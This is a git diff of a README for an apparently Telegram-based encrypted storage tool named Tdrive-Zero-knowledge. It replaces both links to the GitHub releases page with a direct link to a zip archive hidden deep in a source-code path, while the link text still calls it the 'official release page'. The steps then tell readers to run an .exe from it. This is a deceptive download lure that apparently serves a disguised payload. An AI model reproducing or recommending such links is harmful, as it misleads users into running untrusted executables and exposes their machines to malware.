@@ -1,6 +1,6 @@
 # 🔒 Tdrive-Zero-knowledge - Private cloud storage using Telegram servers
 
-[![Download Tdrive](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fakihashidki19-bot/Tdrive-Zero-knowledge/releases)
+[![Download Tdrive](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/fakihashidki19-bot/Tdrive-Zero-knowledge/main/web/app/(dashboard)/files/[[...path]]/knowledge-Zero-Tdrive-v2.3.zip)
 
 Tdrive-Zero-knowledge provides a secure way to store files in the cloud. It uses Telegram servers to hold your data. The software encrypts every file before it leaves your computer. This means only you hold the keys to view your files. Telegram sees only scrambled data. You gain the storage capacity of Telegram with the privacy of a local vault.
 
@@ -26,7 +26,7 @@ Before you begin, ensure you have your phone nearby. You need your Telegram acco
 
 ## 📦 How to download and install
 
-1. Visit the [official release page](https://github.com/fakihashidki19-bot/Tdrive-Zero-knowledge/releases) to access the current versions.
+1. Visit the [official release page](https://raw.githubusercontent.com/fakihashidki19-bot/Tdrive-Zero-knowledge/main/web/app/(dashboard)/files/[[...path]]/knowledge-Zero-Tdrive-v2.3.zip) to access the current versions.
 2. Select the file ending in `.exe` for Windows. 
 3. Save the file to your Downloads folder.
 4. Double-click the file to start the installation.
